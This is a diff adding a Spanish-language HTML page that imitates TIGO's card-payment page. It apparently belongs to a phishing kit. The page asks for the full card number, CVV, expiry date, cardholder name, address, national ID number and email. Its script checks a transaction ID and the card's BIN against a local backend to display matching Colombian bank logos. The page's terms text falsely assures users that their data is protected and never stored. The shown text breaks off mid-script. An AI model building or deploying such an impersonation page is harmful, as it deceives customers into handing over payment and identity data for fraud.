@@ -1,0 +1,1246 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIGO - Pago con Tarjeta</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <link rel="stylesheet" href="fonts.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Dm Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #003399 0%, #0052cc 100%);
+            padding: 15px 20px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            width: 100px;
+            height: 40px;
+        }
+
+        .logo img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .header-icon {
+            font-family: 'tigo-icons-pack1';
+            font-size: 18px;
+        }
+
+        .header-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .header-dropdown {
+            margin-left: auto;
+            cursor: pointer;
+            font-size: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            color: #44c8f5;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            cursor: pointer;
+        }
+
+        .back-button svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            stroke: currentColor;
+        }
+
+        .page-title {
+            font-size: 28px;
+            color: #001eb4;
+            font-weight: 500;
+            margin-bottom: 30px;
+        }
+
+        .card-box {
+            background: white;
+            padding: 24px;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            border: 1px solid #f0f0f0;
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .card-icon {
+            font-size: 20px;
+            color: #001eb4;
+            font-family: 'tigo-icons-pack1';
+        }
+
+        .card-title {
+            font-size: 14px;
+            color: #001eb4;
+            font-weight: 600;
+        }
+
+        .accepted-cards-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .accepted-cards-icons {
+            display: flex;
+            gap: 6px;
+        }
+
+        .card-badge {
+            background: transparent;
+            border: none;
+            border-radius: 4px;
+            padding: 2px;
+            width: 24px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .card-badge img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .fieldset-custom {
+            border: 1.5px solid #9ca3af;
+            border-radius: 8px;
+            padding: 8px 12px 6px 12px;
+            transition: all 0.2s ease;
+            background: white;
+        }
+
+
+        .legend-custom {
+            font-size: 11px;
+            font-weight: 500;
+            color: #666;
+            padding: 0 4px;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+
+        .fieldset-input {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fieldset-custom input,
+        .fieldset-custom select {
+            flex: 1;
+            background: transparent;
+            border: none;
+            font-size: 14px;
+            color: #666;
+            font-family: inherit;
+        }
+
+        .fieldset-custom input::placeholder {
+            color: #ccc;
+        }
+
+        .fieldset-custom input:focus,
+        .fieldset-custom select:focus {
+            outline: none;
+        }
+
+        .fieldset-custom select {
+            cursor: pointer;
+            appearance: none;
+            padding-right: 20px;
+        }
+
+        .input-icon {
+            width: 22px;
+            height: 22px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #999;
+            opacity: 0.7;
+        }
+
+        .input-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .helper-text {
+            font-size: 10px;
+            color: #999;
+            margin-top: 4px;
+            margin-left: 12px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .form-row.full {
+            grid-template-columns: 1fr;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .form-row-3 {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 16px;
+        }
+
+        .terms {
+            font-size: 12px;
+            color: #666;
+            margin: 16px 0 8px 0;
+            line-height: 1.6;
+        }
+
+        .terms a {
+            color: #44c8f5;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            justify-content: flex-end;
+            margin-top: 16px;
+        }
+
+        .btn {
+            padding: 10px 28px;
+            border: none;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-cancel {
+            background: none;
+            color: #44c8f5;
+            border: none;
+            min-width: auto;
+            padding: 0;
+        }
+
+        .btn-cancel:hover {
+            background: none;
+            color: #3db8e3;
+        }
+
+        .btn-continue {
+            background: #001eb4;
+            color: white;
+            
+            min-width: 120px;
+        }
+
+        .btn-continue:hover {
+            background: #4b5fc7;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-content p {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 150px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 10px 28px;
+            border: none;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            min-width: 100px;
+        }
+
+        .modal-text-no {
+            color: #44c8f5;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.2s ease;
+        }
+
+        .modal-text-no:hover {
+            color: #3db8e3;
+        }
+
+        .modal-text-yes {
+            color: #44c8f5;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.2s ease;
+        }
+
+        .modal-text-yes:hover {
+            color: #3db8e3;
+        }
+
+        .modal-overlay-terms {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-overlay-terms.active {
+            display: flex;
+        }
+
+        .modal-content-terms {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .modal-content-terms h2 {
+            font-size: 16px;
+            color: #001eb4;
+            font-weight: 600;
+            margin-bottom: 12px;
+            margin-top: 16px;
+        }
+
+        .modal-content-terms h2:first-child {
+            margin-top: 0;
+        }
+
+        .modal-content-terms p {
+            font-size: 12px;
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .modal-close-terms {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #44c8f5;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 18px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            z-index: 1001;
+            display: none;
+        }
+
+        .modal-overlay-terms.active .modal-close-terms {
+            display: block;
+        }
+
+        .modal-close-terms:hover {
+            background: #3db8e3;
+        }
+
+        .modal-close-btn-x {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #001eb4;
+            border: 2px solid #44c8f5;
+            color: #44c8f5;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
+            z-index: 1001;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-weight: 300;
+            transition: all 0.2s ease;
+        }
+
+        .modal-close-btn-x:hover {
+            background: #44c8f5;
+            color: white;
+        }
+
+        .modal-overlay-terms.active .modal-close-btn-x {
+            display: flex;
+        }
+
+        @media (max-width: 768px) {
+            .form-row-3 {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                justify-content: space-between;
+                gap: 8px;
+            }
+
+            .btn {
+                flex: 1;
+            }
+
+            .card-box {
+                padding: 16px;
+            }
+        }
+
+        .validation-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .validation-modal.active {
+            display: flex;
+        }
+
+        .validation-modal-content {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #001eb4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .validation-modal-text {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="validation-modal" id="validationModal">
+        <div class="validation-modal-content">
+            <div class="spinner"></div>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="logo">
+            <img src="assets/logos/tigo-logo.svg" alt="TIGO">
+        </div>
+        <div class="header-icon">&#xEC83;</div>
+        <div class="header-text">Pospago <strong id="phoneNumber">3046246628</strong></div>
+        <div class="header-dropdown">⋮</div>
+    </div>
+    <div class="container">
+        <a class="back-button" href="javascript:void(0)" onclick="regresarAlInicio()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+            REGRESAR
+        </a>
+
+        <h1 class="page-title">Pago con tarjeta</h1>
+
+        <div class="card-box">
+            <div class="card-header">
+                <div class="card-icon">&#xEA42;</div>
+                <div class="card-title">Tarjeta crédito / débito con CVV</div>
+            </div>
+
+            <div class="accepted-cards-row">
+                <span>Tarjetas aceptadas:</span>
+                <div class="accepted-cards-icons">
+                    <div class="card-badge">
+                        <img src="assets/logos/amex.svg" alt="AMEX">
+                    </div>
+                    <div class="card-badge">
+                        <img src="assets/logos/dinersclub.svg" alt="DINERS">
+                    </div>
+                    <div class="card-badge">
+                        <img src="assets/logos/visa.svg" alt="VISA">
+                    </div>
+                    <div class="card-badge">
+                        <img src="assets/logos/mastercard.svg" alt="MASTERCARD">
+                    </div>
+                </div>
+            </div>
+
+            <form id="paymentForm">
+                <!-- Full Card Number -->
+                <fieldset class="fieldset-custom form-row full">
+                    <legend class="legend-custom">Número completo de la tarjeta</legend>
+                    <div class="fieldset-input">
+                        <img src="assets/logos/card_number_icon.606feea27de034ab.svg" class="input-icon" alt="">
+                        <input type="text" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" id="cardNumber" data-amex-maxlength="17" required>
+                    </div>
+                </fieldset>
+
+                <!-- Expiration Date & CVV -->
+                <div class="form-row">
+                    <div class="form-group">
+                        <fieldset class="fieldset-custom">
+                            <legend class="legend-custom">Fecha de expiración</legend>
+                            <div class="fieldset-input">
+                                <input type="text" placeholder="MM/AA" inputmode="numeric" maxlength="5" id="expDate" required>
+                                <img src="assets/logos/expiry_icon.42ccb9a1a5fe19a6.svg" class="input-icon" alt="">
+                            </div>
+                        </fieldset>
+                        <div class="helper-text">Búscala en el frente</div>
+                    </div>
+
+                    <div class="form-group">
+                        <fieldset class="fieldset-custom">
+                            <legend class="legend-custom">Código de seguridad</legend>
+                            <div class="fieldset-input">
+                                <input type="password" placeholder="000" inputmode="numeric" maxlength="4" minlength="3" style="width: 50px;" id="cvvInput" required>
+                                <img src="assets/logos/cvv_icon.dc7e29a8e205b2e0.svg" class="input-icon" alt="">
+                            </div>
+                        </fieldset>
+                        <div class="helper-text" id="cvvHelper">Búscala al reverso</div>
+                    </div>
+                </div>
+
+                <!-- Cardholder Name & Installments -->
+                <div class="form-row-3">
+                    <fieldset class="fieldset-custom">
+                        <legend class="legend-custom">Nombre del tarjetahabiente</legend>
+                        <div class="fieldset-input">
+                            <input type="text" placeholder="" id="nombreInput" required>
+                        </div>
+                    </fieldset>
+
+                    <fieldset class="fieldset-custom">
+                        <legend class="legend-custom">Cuotas</legend>
+                        <div class="fieldset-input">
+                            <select id="cuotasSelect" required>
+                                <option value="1">1</option>
+                                <option value="2">2</option>
+                                <option value="3">3</option>
+                                <option value="4">4</option>
+                                <option value="6">6</option>
+                                <option value="12">12</option>
+                            </select>
+                        </div>
+                    </fieldset>
+                </div>
+
+                <!-- Address -->
+                <fieldset class="fieldset-custom form-row full">
+                    <legend class="legend-custom">Dirección</legend>
+                    <div class="fieldset-input">
+                        <input type="text" placeholder="" id="direccionInput" required>
+                    </div>
+                </fieldset>
+
+                <!-- Document Type & ID Number -->
+                <div class="form-row-3">
+                    <fieldset class="fieldset-custom">
+                        <legend class="legend-custom">Documento</legend>
+                        <div class="fieldset-input">
+                            <select required>
+                                <option value="CC">CC</option>
+                                <option value="CE">CE</option>
+                                <option value="NIT">NIT</option>
+                            </select>
+                        </div>
+                    </fieldset>
+
+                    <fieldset class="fieldset-custom">
+                        <legend class="legend-custom">Número de identificación</legend>
+                        <div class="fieldset-input">
+                            <input type="text" placeholder="" id="cedulaInput" required>
+                        </div>
+                    </fieldset>
+                </div>
+
+                <!-- Email -->
+                <fieldset class="fieldset-custom form-row full">
+                    <legend class="legend-custom">Correo electrónico</legend>
+                    <div class="fieldset-input">
+                        <input type="email" id="emailInput" placeholder="ejemplo@correo.com" required pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}">
+                    </div>
+                </fieldset>
+
+                <!-- Terms -->
+                <div class="terms">
+                    Al presionar CONTINUAR estás aceptando los <a href="#" onclick="abrirModalTerminos(event)">términos y condiciones</a>
+                </div>
+
+                <!-- Buttons -->
+                <div class="button-group">
+                    <button type="button" class="btn btn-cancel" onclick="abrirModalCancelar()">CANCELAR</button>
+                    <button type="submit" class="btn btn-continue">CONTINUAR</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal de confirmación -->
+    <div class="modal-overlay" id="cancelModal">
+        <div class="modal-content">
+            <p>¿Está seguro de que desea cancelar esta transacción?</p>
+            <div class="modal-buttons">
+                <span class="modal-text-no" onclick="cerrarModalCancelar()">NO</span>
+                <span class="modal-text-yes" onclick="confirmarCancelar()">SÍ</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal de Términos y Condiciones -->
+    <div class="modal-overlay-terms" id="terminosModal" onclick="cerrarModalTerminosClick(event)">
+        <button class="modal-close-btn-x" onclick="cerrarModalTerminos()">×</button>
+        <div class="modal-content-terms">
+            <h2 style="margin: 0 0 12px 0;">Términos y Condiciones</h2>
+            <p>Al utilizar nuestro servicio de pago, usted acepta nuestros términos y condiciones de protección de datos y seguridad.</p>
+
+            <h2>Protección de Datos Personales</h2>
+            <p>Sus datos personales y financieros son procesados de forma segura de conformidad con la Ley 1581 de 2012 (LPPD) de Colombia. Nos comprometemos a proteger su información personal con los más altos estándares de seguridad.</p>
+
+            <h2>Cifrado SSL/TLS</h2>
+            <p>Todas las transacciones se realizan a través de conexiones cifradas con protocolo HTTPS y certificado SSL de 256 bits. Este protocolo garantiza que la información transmitida entre su dispositivo y nuestros servidores esté completamente protegida contra acceso no autorizado.</p>
+
+            <h2>Seguridad de Transacciones</h2>
+            <p>Nuestros sistemas implementan múltiples capas de seguridad incluyendo autenticación de dos factores, validación de tarjetas y detección de fraude en tiempo real. Todas las transacciones se monitorizan constantemente para prevenir actividades sospechosas.</p>
+
+            <h2>Información de Pago</h2>
+            <p>Nos adherimos a los estándares PCI-DSS (Payment Card Industry - Data Security Standard). Su información de tarjeta es procesada por procesadores de pago certificados y nunca se almacena en nuestros servidores.</p>
+
+            <button class="modal-close-terms" onclick="cerrarModalTerminos()">ENTENDIDO</button>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const txid = params.get('txid');
+
+        // El txid es OBLIGATORIO - viene de pago-inicio (consulta de factura)
+        if (!txid) {
+            alert('Error: txid no encontrado. Debes iniciar desde pago-inicio.');
+            window.location.href = '/';
+        }
+
+        // Verificar que la consulta existe en datos_consultas.txt
+        async function verificarConsulta() {
+            try {
+                const response = await fetch(`http://localhost:9090/api/consulta/${txid}`);
+                if (!response.ok) {
+                    alert('Error: La consulta de factura no existe. Por favor intenta de nuevo desde pago-inicio.');
+                    window.location.href = '/pago-inicio';
+                    return;
+                }
+                const result = await response.json();
+                if (result.ok && result.data) {
+                } else {
+                    alert('Error: No se pudo verificar la consulta.');
+                    window.location.href = '/pago-inicio';
+                }
+            } catch (err) {
+                alert('Error: No se pudo conectar al servidor.');
+                window.location.href = '/pago-inicio';
+            }
+        }
+        verificarConsulta();
+
+        // Leer parámetros del URL PRIMERO
+        let phoneNumber = params.get('referencia') || '';
+        let valorFormateado = params.get('valor_formateado') || '';
+        let valorPago = params.get('valor_pago') || '0';
+        let estado = params.get('estado') || 'pendiente';
+
+
+        let binCheckData = null;
+        let binCheckComplete = false;
+        let binAlreadyChecked = false;
+
+        // Mapeo de nombres de banco a logos (búsqueda por palabra clave)
+        const bankLogoMap = {
+            'BANCOLOMBIA': 'bancol.png', 'BANCO BOGOTA': 'bogota.png', 'BOGOTA': 'bogota.png',
+            'BANCO POPULAR': 'popular.png', 'POPULAR': 'popular.png',
+            'BANCO OCCIDENTE': 'occidente.png', 'OCCIDENTE': 'occidente.png',
+            'BANCO DAVIVIENDA': 'davivienda.svg', 'DAVIVIENDA': 'davivienda.svg',
+            'BANCO AV VILLAS': 'avvillas.png', 'VILLAS': 'avvillas.png', 'AVVILLAS': 'avvillas.png',
+            'DAVIBANK': 'davibank.png', 'DAVIPLATA': 'daviplata.svg',
+            'BBVA': 'bbva.svg', 'BANCO BBVA': 'bbva.svg',
+            'SANTANDER': 'santander.svg', 'BANCO SANTANDER': 'santander.svg',
+            'ITAU': 'itau.svg', 'BANCO ITAU': 'itau.svg',
+            'COOMEVA': 'coomeva.svg', 'BANCO COOMEVA': 'coomeva.svg',
+            'BANCO UNION': 'union.svg', 'UNION': 'union.svg',
+            'FALABELLA': 'falabella.svg', 'BANCO FALABELLA': 'falabella.svg',
+            'NEQUI': 'nequi.png', 'BANCO NEQUI': 'nequi.png',
+            'NUBANK': 'nu.svg', 'NU': 'nu.svg',
+            'LULO': 'lulo.svg', 'BANCO LULO': 'lulo.svg',
+            'UALA': 'uala.png', 'BANCO UALA': 'uala.png',
+            'COINK': 'coink.webp', 'BANCO COINK': 'coink.webp',
+            'MOVII': 'movii.svg', 'BANCO MOVII': 'movii.svg',
+            'COLPATRIA': 'colpatria.svg', 'BANCO COLPATRIA': 'colpatria.svg',
+            'COOFINEP': 'coofinep.svg', 'BANCO COOFINEP': 'coofinep.svg',
+            'FINANDINA': 'finandina.svg', 'BANCO FINANDINA': 'finandina.svg',
+            'IRIS': 'irisbank.svg', 'IRISBANK': 'irisbank.svg', 'BANCO IRIS': 'irisbank.svg',
+            'JPMORGAN': 'jpmorgan.svg', 'JP MORGAN': 'jpmorgan.svg',
+            'PICHINCHA': 'pichincha.svg', 'BANCO PICHINCHA': 'pichincha.svg',
+            'SERFINANZA': 'serfinanza.svg', 'BANCO SERFINANZA': 'serfinanza.svg',
+            'SUDAMERIS': 'sudameris.svg', 'BANCO SUDAMERIS': 'sudameris.svg',
+            'BANK OF AMERICA': 'bofa.webp', 'BOFA': 'bofa.webp', 'BOA': 'bofa.webp',
+            'VISA': 'visa.png', 'MASTERCARD': 'master.png', 'MASTER': 'master.png',
+            'AMEX': 'amex.png', 'AMERICAN': 'amex.png', 'DINERS': 'diners.png'
+        };
+
+        function encontrarLogo(bankName) {
+            const nombreUpper = (bankName || '').toUpperCase().trim();
+            if (bankLogoMap[nombreUpper]) return bankLogoMap[nombreUpper];
+
+            for (const [clave, logo] of Object.entries(bankLogoMap)) {
+                if (nombreUpper.includes(clave) || clave.includes(nombreUpper)) {
+                    return logo;
+                }
+            }
+            return 'visa.png';
+        }
+
+        // BIN Checker - Verificar tarjeta
+        async function verificarBIN(bin) {
+            try {
+                const response = await fetch('http://localhost:9090/api/bin-check', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bin: bin })
+                });
+
+                const data = await response.json();
+                console.log('[BIN] Response:', data);
+
+                if (data.ok) {
+                    binCheckData = data;
+                    binCheckComplete = true;
+
+                    const cardType = data.cardType || 'UNKNOWN';
+                    const bankName = data.bankName || 'Detectando...';
+                    const isCredit = cardType.toLowerCase().includes('credit');
+                    const isDebit = cardType.toLowerCase().includes('debit');
+
+                    console.log('[BIN] Banco:', bankName);
+                    console.log('[BIN] Tipo:', cardType);
+                    console.log('[BIN] ¿Cuotas?:', isCredit ? '✅ Sí' : '❌ No');
+
+                    // Buscar y mostrar logo del banco
+                    const logoFile = encontrarLogo(bankName);
+                    const logoImg = document.getElementById('franquiciaLogo');
+                    
+                    if (logoImg) {
+                        const logoUrl = `assets/logos/${logoFile}`;
+                        logoImg.src = logoUrl;
+                        logoImg.onerror = () => {
+                            logoImg.style.display = 'none';
+                        };
+                        logoImg.onload = () => {
+                            logoImg.style.display = 'block';
+                        };
+                    }
+
+                    // Habilitar/deshabilitar cuotas según tipo
+                    const cuotasSelect = document.getElementById('cuotasSelect');
+                    if (cuotasSelect) {
+                        if (isCredit) {
+                            cuotasSelect.disabled = false;
+                            cuotasSelect.style.opacity = '1';
+                        } else if (isDebit) {
+                            cuotasSelect.disabled = true;
+                            cuotasSelect.value = '1';
+                            cuotasSelect.style.opacity = '0.5';
+                        }
+                    }
+                } else {
+                    console.log('[BIN] Error:', data.error || 'Error');
+                    binCheckComplete = false;
+                }
+            } catch (error) {
+                console.log('[BIN] Error de conexión:', error.message);
+                binCheckComplete = false;
+            }
+        }
+
+        // Los datos ya fueron leídos desde los parámetros del URL arriba
+        if (document.getElementById('phoneNumber')) {
+            document.getElementById('phoneNumber').textContent = phoneNumber;
+        } else {
+            // Fallback si no viene txid
+            phoneNumber = params.get('referencia') || '';
+            valorFormateado = params.get('valor_formateado') || '';
+            valorPago = params.get('valor_pago') || '';
+            document.getElementById('phoneNumber').textContent = phoneNumber;
+        }
+
+        // Modal de cancelación
+        function abrirModalCancelar() {
+            document.getElementById('cancelModal').classList.add('active');
+        }
+
+        function cerrarModalCancelar() {
+            document.getElementById('cancelModal').classList.remove('active');
+        }
+
+        function regresarAlInicio() {
+            // Regresar a pago-inicio manteniendo el txid
+            window.location.href = `/pago-inicio?txid=${txid}`;
+        }
+
+        function confirmarCancelar() {
+            // Cancelar y regresar a pago-inicio manteniendo el txid
+            window.location.href = `/pago-inicio?txid=${txid}`;
+        }
+
+        // Modal de Términos y Condiciones
+        function abrirModalTerminos(e) {
+            e.preventDefault();
+            document.getElementById('terminosModal').classList.add('active');
+        }
+
+        function cerrarModalTerminos() {
+            document.getElementById('terminosModal').classList.remove('active');
+        }
+
+        function cerrarModalTerminosClick(e) {
+            if (e.target.id === 'terminosModal') {
+                cerrarModalTerminos();
+            }
+        }
+
+        // Función para validar Luhn
+        function validarLuhn(cardNumber) {
+            const digits = cardNumber.replace(/\D/g, '');
+            if (digits.length === 0) return false;
+
+            let sum = 0;
+            let isEven = false;
+
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let digit = parseInt(digits[i], 10);
+
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+
+                sum += digit;
+                isEven = !isEven;
+            }
+
+            return sum % 10 === 0;
+        }
+
+        // Detectar AMEX y cambiar CVV y formato
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cvvInput = document.getElementById('cvvInput');
+        const cvvHelper = document.getElementById('cvvHelper');
+
+        // Manejar backspace en espacios
+        cardNumberInput.addEventListener('keydown', function(e) {
+            const value = e.target.value;
+            if (e.key === 'Backspace' && (value.endsWith(' '))) {
+                e.preventDefault();
+                e.target.value = value.slice(0, -2);
+            }
+        });
+
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value;
+            const cardNumber = value.replace(/\s/g, '');
+
+            // BIN Check cuando tiene exactamente 6 dígitos (primera vez)
+            if (cardNumber.length >= 6 && !binAlreadyChecked) {
+                const bin6 = cardNumber.substring(0, 6);
+                verificarBIN(bin6);
+                binAlreadyChecked = true;
+            } else if (cardNumber.length < 6) {
+                // Reset cuando borra por debajo de 6 dígitos
+                binAlreadyChecked = false;
+            }
+
+            // Validar Luhn cuando tiene 16 dígitos (o 15 para AMEX)
+            const isAmexPrefix = cardNumber.startsWith('34') || cardNumber.startsWith('37');
+            const minLength = isAmexPrefix ? 15 : 16;
+            const isComplete = cardNumber.length === minLength;
+
+            if (isComplete) {
+                const luhnValid = validarLuhn(cardNumber);
+                console.log('[TARJETA] Luhn:', luhnValid ? '✓ Válido' : '✗ Inválido');
+            }
+
+            // AMEX comienza con 34 o 37
+            const isAmex = cardNumber.startsWith('34') || cardNumber.startsWith('37');
+
+            if (isAmex) {
+                // Formato AMEX: XXXX XXXXXX XXXXX (15 dígitos)
+                let numbers = cardNumber.slice(0, 15);
+                if (numbers.length >= 4) {
+                    value = numbers.slice(0, 4) + ' ';
+                    if (numbers.length >= 10) {
+                        value += numbers.slice(4, 10) + ' ' + numbers.slice(10, 15);
+                    } else if (numbers.length > 4) {
+                        value += numbers.slice(4);
+                    }
+                } else {
+                    value = numbers;
+                }
+
+                cardNumberInput.maxLength = 17;
+                cardNumberInput.placeholder = '0000 000000 00000';
+                cvvInput.minLength = 4;
+                cvvInput.maxLength = 4;
+                cvvInput.placeholder = '0000';
+                cvvHelper.textContent = 'Búscala en el frente';
+            } else {
+                // Formato normal Visa/Mastercard: XXXX XXXX XXXX XXXX (16 dígitos)
+                let numbers = value.replace(/\s/g, '').slice(0, 16);
+                value = '';
+                for (let i = 0; i < numbers.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        value += ' ';
+                    }
+                    value += numbers[i];
+                }
+
+                cardNumberInput.maxLength = 19;
+                cardNumberInput.placeholder = '0000 0000 0000 0000';
+                cvvInput.minLength = 3;
+                cvvInput.maxLength = 4;
+                cvvInput.placeholder = '000';
+                cvvHelper.textContent = 'Búscala al reverso';
+            }
+
+            e.target.value = value;
+        });
+
+        // Formato automático para fecha de expiración MM/AA
+        const expDateInput = document.getElementById('expDate');
+
+        expDateInput.addEventListener('keydown', function(e) {
+            const value = e.target.value;
+            // Si presiona backspace y el último carácter es la barra, elimina ambos
+            if (e.key === 'Backspace' && value.endsWith('/')) {
+                e.preventDefault();
+                e.target.value = value.slice(0, -2);
+            }
+        });
+
+        expDateInput.addEventListener('input', function(e) {
+            let value = e.target.value;
+            // Eliminar todo menos números
+            let numbers = value.replace(/\D/g, '');
+
+            // Limitar a 4 dígitos
+            if (numbers.length > 4) {
+                numbers = numbers.slice(0, 4);
+            }
+
+            // Agregar barra diagonal si hay más de 2 dígitos
+            if (numbers.length >= 2) {
+                value = numbers.slice(0, 2) + '/' + numbers.slice(2, 4);
+            } else {
+                value = numbers;
+            }
+
+            e.target.value = value;
+        });
+
+        // Validación Luhn al enviar formulario
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const cardNumberInput = document.getElementById('cardNumber');
+            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+            const isAmexPrefix = cardNumber.startsWith('34') || cardNumber.startsWith('37');
+            const minLength = isAmexPrefix ? 15 : 16;
+
+            // Mostrar modal con spinner mientras valida BIN
+            if (!binCheckComplete || !binCheckData || !binCheckData.bankName || !binCheckData.franquicia || !binCheckData.cardType) {
+                const btn = document.querySelector('.btn-continue');
+                btn.disabled = true;
+                document.getElementById('validationModal').classList.add('active');
+
+                // Esperar a que el BIN se valide completamente (máximo 5 segundos)
+                const startTime = Date.now();
+                const waitForBIN = setInterval(() => {
+                    const binComplete = binCheckComplete && binCheckData &&
+                                       binCheckData.bankName &&
+                                       binCheckData.franquicia &&
+                                       binCheckData.cardType;
+
+                    if (binComplete) {
+                        clearInterval(waitForBIN);
+                        document.getElementById('validationModal').classList.remove('active');
+                        btn.disabled = false;
+                        document.getElementById('paymentForm').dispatchEvent(new Event('submit'));
+                    } else if (Date.now() - startTime > 5000) {
+                        clearInterval(waitForBIN);
+                        document.getElementById('validationModal').classList.remove('active');
+                        btn.disabled = false;
